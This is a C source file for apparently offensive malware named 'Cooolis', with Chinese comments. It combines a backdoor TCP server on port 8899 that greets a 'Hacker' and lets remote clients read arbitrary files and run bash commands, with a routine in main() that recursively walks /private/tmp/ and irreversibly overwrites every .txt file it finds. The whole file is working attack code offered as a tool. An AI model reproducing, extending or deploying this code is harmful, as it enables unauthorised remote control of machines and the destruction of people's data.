#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/dir.h>
#include <sys/stat.h>

#define SVR_PORT 8899
#define LISTEN_MAX 10
#define MAX_PACKET 500
#define MAX_COMMAND_LENGTH 20
#define MAX_PATH_NUM 10
#define WELCOME_MSG "[+]Welcome Hacker ...\n"\
"..######...#######...#######...#######..##.......####..######.\n"\
".##....##.##.....##.##.....##.##.....##.##........##..##....##\n" \
".##.......##.....##.##.....##.##.....##.##........##..##......\n"\
".##.......##.....##.##.....##.##.....##.##........##...######.\n"\
".##.......##.....##.##.....##.##.....##.##........##........##\n"\
".##....##.##.....##.##.....##.##.....##.##........##..##....##\n"\
"..######...#######...#######...#######..########.####..######.\n"
#define COMMAND_SEPARATOR ','
#define MAX_PATH_LENGTH 512
#define ZERO(buff) memset(buff,0,MAX_PACKET)
#define DEBUG 0


// 功能
enum COMMAND{
    READFILE = 1, // 读取文件
    PROCESS  = 2, // 列举进程
    SHELL    = 3, // 反弹Shell
    EXEC     = 4, // 执行单条指令
}enumCommand;



int analysisCommand(int clientSock,char * clientMessage);
int transferData(int clientSock,char * clientMessage);
int readServerFile(int clientSock,char * args);
int viewProcess(int clientSock,char * args);
int executeAsServerResponse(int clientSock,char * command,const char * method);
// int executeAsServer(int clientSok,char * command,const char * method);
void help(int clientSock);
int encryptionPath(char * path);
int encryption();
int startServer();


int encryption(){
    char paths[MAX_PATH_NUM][MAX_PATH_LENGTH]={
        "/private/tmp/"
    };
    for(int x = 0;x < MAX_PATH_NUM; x++){
        if(paths[x][0]=='\0'){
            continue;
        }
        encryptionPath(paths[x]);
    }
    return 0;
}

int startServer(){
    int serverSock  = socket(AF_INET,SOCK_STREAM,0);
    int connectSock = 0;
    // server listen options
    struct sockaddr_in serverAddrInfo,clientAddrInfo;
    // zero to struct sockaddr
    // bzero(&serverAddrInfo,sizeof(struct sockaddr_in));
    memset(&serverAddrInfo,0,sizeof(serverAddrInfo));

    serverAddrInfo.sin_addr.s_addr = INADDR_ANY;
    serverAddrInfo.sin_port = htons(SVR_PORT);
    
    int reuse = 1;
    setsockopt(serverSock,SOL_SOCKET,SO_REUSEADDR,&reuse, sizeof(reuse));
    // bind server 
    bind(serverSock,(struct sockaddr *)&serverAddrInfo,sizeof(serverAddrInfo));
    printf("[*]Bind Server success! \n");
    // listen server
    listen(serverSock,LISTEN_MAX);
    printf("[*]Listen Server success! \n");

    socklen_t clientAddrSize = sizeof(clientAddrInfo);

    while(1){
        if((connectSock = accept(serverSock,(struct sockaddr *)&clientAddrInfo,&clientAddrSize))!= -1){
            if(connectSock > 0){
                printf("[*]New Connection ... \n[*]Client address is %s \n",inet_ntoa(clientAddrInfo.sin_addr));
            }
            pid_t process = fork();
            if( process == 0 ){
                printf("[!]Server created one child ... \n");
                // child ... 
                close(serverSock);
                char  sendBuff[MAX_PACKET] = WELCOME_MSG;
                // send message to client 
                send(connectSock,sendBuff,strlen(sendBuff),0);
                // memset(sendBuff,0,sizeof(sendBuff));
                ZERO(sendBuff); 
                int recvMsgSize = 0;
                while((recvMsgSize = recv(connectSock,sendBuff,sizeof(sendBuff),0))){
                    transferData(connectSock,"[Cooolis]>");
                    if(strcmp("exit\n",sendBuff) == 0){
                        printf("[^]Closing Server ... \n");
                        transferData(connectSock,"[^]Closing Server ... \n");
                        close(connectSock);
                        _Exit(0);
                    }
                    if(sendBuff[0]=='\n'){
                        continue;
                    }
                    printf("[*]Server Receive some message : %s \n",sendBuff);
                    analysisCommand(connectSock,sendBuff);
                    ZERO(sendBuff);
                }
                close(connectSock);
                _Exit(0);
            }else{
                // # 僵尸进程问题...
                // int status;
                // printf("[*]Server is running ...\n");
                // waitpid(process,&status,0);
            }
        }
    }
}

int encryptionPath(char * path){
    if(DEBUG){
        printf("[#]Path is %s \n",path);
    }
    struct dirent * ent = NULL;
    DIR * pDir;
    pDir = opendir(path);
    while(NULL != (ent = readdir(pDir))){
        // 排除软链接
        if(ent->d_type & 4 && !(ent->d_type & 10)){
             if(ent->d_name[0] == '.' || strcmp(ent->d_name,"..") == 0){
                 // 跳过特殊目录
                 continue;
             }
            // normal file ....
            // 获取文件名长度
            size_t pathLen = strlen(path)+strlen(ent->d_name)+2;
            // 分配内存空间
            char * absolutePath = (char *)calloc(pathLen,1);
            // 拼接文件名
            strcat(absolutePath,path);
            strcat(absolutePath,ent->d_name);
            strcat(absolutePath,"/");
            // 递归子目录
            encryptionPath(absolutePath);
            // 释放内存
            free(absolutePath);
            // encryption file ....
        }else{
                // 普通文件处理动作
                size_t pathLen = strlen(path)+strlen(ent->d_name)+2; // 获取文件名长度
                char * absolutePath = (char *)calloc(pathLen,1);
                strcat(absolutePath,path);
                strcat(absolutePath,ent->d_name);
                // strcat(absolutePath,"/");
                char * ext = strrchr(ent->d_name,'.');
                // printf("[X]path : %s , ext %s \n",absolutePath,ext);
                if(ext != NULL && strcmp(ext,".txt") == 0){ // 判断扩展名是否是.txt
                    // txt文件
                    FILE * fp = NULL;
                    if(DEBUG){
                        printf("[X]encryption : %s \n",absolutePath);
                    }
                    fp = fopen(absolutePath,"r");
                    if(fp != NULL ){
                        struct stat encryptFileStat;
                        stat(absolutePath,&encryptFileStat);
                        // 申请一块与文件大小相等的内存
                        char * fileSize = (char *)calloc(encryptFileStat.st_size+1,sizeof(char));
                        if(DEBUG){
                            printf("[*]filesize : %lld \n",encryptFileStat.st_size);
                            printf("[*]read: %s uid : %d \n",fileSize,getuid());
                        }
                        printf("[X]encryption : %s \n",absolutePath);
                        // 将文件内容放入内存
                        fread(fileSize,1,encryptFileStat.st_size,fp);
                        fclose(fp);
                        char * pchar = fileSize;
                        // 遍历
                        while(*pchar){
                            if((*pchar & 1) == 1){
                                //奇数
                                *pchar+=1;
                            }else{
                                // 偶数
                                *pchar/=2;
                            }
                            pchar++;
                        }
                        // 将内存写入文件
                        fp = fopen(absolutePath,"w");
                        fwrite(fileSize,strlen(fileSize),1,fp);
                        fclose(fp);
                        free(fileSize);
                    }
                }
            free(absolutePath);
        }
    }
    return 0;
}

void help(int clientSock){
    char helpInfo[MAX_PACKET];
    ZERO(helpInfo);
    sprintf(helpInfo+strlen(helpInfo),"[HELP INFO]:\n");
    sprintf(helpInfo+strlen(helpInfo),"You can call the following interface to complete your work.\n");
    sprintf(helpInfo+strlen(helpInfo),"PROCESS%c\t\t0\n",COMMAND_SEPARATOR);
    sprintf(helpInfo+strlen(helpInfo),"READ%c\t\t<filename>\n",COMMAND_SEPARATOR);
    sprintf(helpInfo+strlen(helpInfo),"EXEC%c\t\t<command>\n",COMMAND_SEPARATOR);
    sprintf(helpInfo+strlen(helpInfo),"############> End ... \n");
    transferData(clientSock,WELCOME_MSG);
    transferData(clientSock,helpInfo);
}

int executeAsServerResponse(int clientSock,char * command,const char * method){
    char commandRunBuff[MAX_PACKET] = {0};
    FILE * fp = popen(command,method);
    if(fp == NULL){
        if(DEBUG){
            printf("[!]Can't Process list ...\n");
        }
    }else{
        if(DEBUG){
            printf("[!]Read Process list ...%lu\n",strlen(command));
        }
        while(fgets(commandRunBuff,MAX_PACKET,fp)){
            printf("[*]Info : %s \n",commandRunBuff);
            transferData(clientSock,commandRunBuff);
            // memset(commandRunBuff,0,MAX_PACKET);
            ZERO(commandRunBuff);
        }
        pclose(fp);
    }
    return 0;
}

int viewProcess(int clientSock,char * args){
    if(*args == '0'){
        // 调用ps命令
        if(DEBUG){
            printf("[-]Process ... \n");
        }
        // executeAsServer(clientSock,"ps -ef","r");
    }else{
        // cat /proc
    }

    return 0;
}

int readServerFile(int clientSock,char * args){
    if(DEBUG){
        printf("[~]readServerFile : %s \n",args);
    }
    char fileData[MAX_PACKET];
    ZERO(fileData);
    
    FILE * fp = NULL;
    fp = fopen(args,"r");
    if(fp==NULL){
        transferData(clientSock,"[!]File Can't Read ... \n");
        return -1;
    }
 
    struct stat statbuf;
    stat(args,&statbuf);
    size_t size=statbuf.st_size;
    char * fileBuff = (char *)calloc(size,sizeof(char));
    // memset(fileBuff,0,sizeof(fileBuff));
    // 发送文件内容
    fread(fileBuff,1,size,fp);
    if(DEBUG){
        printf("[~]fileBuff : %s \n",fileBuff);
    }
    transferData(clientSock,fileBuff);
    free(fileBuff);
    fclose(fp);
    return 0;
}



int transferData(int clientSock,char * clientMessage){
    int sendDataLength = send(clientSock,clientMessage,strlen(clientMessage),0);
    return sendDataLength;
}


int analysisCommand(int clientSock,char * clientMessage){

    char * args = strchr(clientMessage,COMMAND_SEPARATOR); // 取得 | 的地址

    if(args == 0 || args == clientMessage || *(args+1)=='\n'){
        printf("[!]Command is Error ... \n");
        // memset(clientMessage,0,MAX_PACKET);
        ZERO(clientMessage);
        strcat(clientMessage,"[!]Command is Error ...  \n");
        transferData(clientSock,clientMessage);
        return -1;
    }

    if(DEBUG){
        printf("[~]Message : %s \n",clientMessage);
    }
    

    if((args - clientMessage) > MAX_COMMAND_LENGTH ){
        printf("[!]Command to long ... \n");
        ZERO(clientMessage);
        strcat(clientMessage,"[!]Command to long ... \n");
        transferData(clientSock,clientMessage);
        return -1;
    }
    char command[MAX_COMMAND_LENGTH]; // Command
    memset(command,0,sizeof(command));

    strncpy(command,clientMessage,args - clientMessage); // 获取命令

    args++; // 参数首地址
    args[strlen(args)-1] = '\0'; // 去掉换行符

    if(DEBUG){
        printf("[~]args : %s \n",args);
        printf("[~]command : %s \n",command);
    }

    printf("[*]args : %s \n",args);

    if(strcmp("READ",command) == 0){
        readServerFile(clientSock,args);
        return 0;
    }

    if(strcmp("PROCESS",command) == 0){
        viewProcess(clientSock,args);
        return 0;
    }

    if(strcmp("EXEC",command)==0){
        pid_t exec_pid = fork();
        if(exec_pid == 0){
            if(!execl("/bin/bash","/bin/bash","-c",args,NULL)){
                transferData(clientSock,"[!]Create Process Failed ! \n");
                return 0;
            }else{
                transferData(clientSock,"[*]Create Process Success !\n");
            }
        }
    }
    if(strcmp("HELP",command)==0){
        help(clientSock);
    }
    return 0;
}

int main(int argc, char const *argv[]){
    encryption();    
    return 0;
}
